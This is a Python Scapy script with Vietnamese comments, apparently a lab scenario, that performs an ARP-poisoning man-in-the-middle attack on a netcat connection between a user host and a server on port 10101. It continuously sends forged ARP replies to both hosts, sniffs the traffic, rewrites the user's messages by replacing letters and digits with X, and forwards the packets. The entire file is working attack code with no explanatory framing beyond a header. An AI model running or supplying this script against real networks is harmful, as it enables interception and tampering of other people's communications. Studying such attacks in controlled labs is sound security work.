#!/usr/bin/env python3
"""
Kịch bản 3: Tấn công Man-in-the-Middle (MITM) trên kết nối Netcat (Port 10101)
Attacker chặn gói tin Netcat từ User (10.2.6.10) gửi Server (10.2.6.20),
thay thế nội dung và chuyển tiếp tới Server.
"""
from scapy.all import *
import threading
import time
import re

IP_USER = "10.2.6.10"
MAC_USER = "a2:da:e2:b5:4a:a1"

IP_SERVER = "10.2.6.20"
MAC_SERVER = "2a:bc:6a:5f:13:97"

PORT = 10101
MAC_ATTACKER = get_if_hwaddr("eth0")

def arp_poison():
    pkt_to_user = Ether(src=MAC_ATTACKER, dst=MAC_USER)/ARP(hwsrc=MAC_ATTACKER, psrc=IP_SERVER, hwdst=MAC_USER, pdst=IP_USER, op=2)
    pkt_to_server = Ether(src=MAC_ATTACKER, dst=MAC_SERVER)/ARP(hwsrc=MAC_ATTACKER, psrc=IP_USER, hwdst=MAC_SERVER, pdst=IP_SERVER, op=2)
    while True:
        sendp(pkt_to_user, iface="eth0", verbose=0)
        sendp(pkt_to_server, iface="eth0", verbose=0)
        time.sleep(1.5)

def spoof_pkt(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        # Chi xu ly cac goi tin chua MAC_ATTACKER o tang Ethernet de tranh loop
        if pkt[Ether].src == MAC_ATTACKER:
            return

        # Tu User -> Server
        if pkt[IP].src == IP_USER and pkt[IP].dst == IP_SERVER and pkt[TCP].dport == PORT:
            newpkt = Ether(src=MAC_ATTACKER, dst=MAC_SERVER)/IP(bytes(pkt[IP]))
            del(newpkt[IP].chksum)
            del(newpkt[TCP].payload)
            del(newpkt[TCP].chksum)

            if pkt.haslayer(Raw):
                original_msg = pkt[Raw].load.decode(errors="ignore")
                # Thay the chu cai thanh X
                modified_msg = re.sub(r'[a-zA-Z0-9]', 'X', original_msg)
                print(f"[!] MITM INTERCEPT: '{original_msg.strip()}' -> '{modified_msg.strip()}'")
                sendp(newpkt/modified_msg.encode(), iface="eth0", verbose=0)
            else:
                sendp(newpkt, iface="eth0", verbose=0)

        # Tu Server -> User
        elif pkt[IP].src == IP_SERVER and pkt[IP].dst == IP_USER and pkt[TCP].sport == PORT:
            newpkt = Ether(src=MAC_ATTACKER, dst=MAC_USER)/IP(bytes(pkt[IP]))
            del(newpkt[IP].chksum)
            del(newpkt[TCP].payload)
            del(newpkt[TCP].chksum)
            if pkt.haslayer(Raw):
                data = pkt[Raw].load
                sendp(newpkt/data, iface="eth0", verbose=0)
            else:
                sendp(newpkt, iface="eth0", verbose=0)

if __name__ == "__main__":
    print(f"[*] Attacker MAC : {MAC_ATTACKER}")
    print(f"[*] Bat dau MITM giua User ({IP_USER}) va Server ({IP_SERVER}) port {PORT}...")
    
    t = threading.Thread(target=arp_poison, daemon=True)
    t.start()
    print("[*] Da kich hoat luong ARP Poisoning song phuong.")

    sniff(iface="eth0", filter=f"tcp port {PORT}", prn=spoof_pkt)
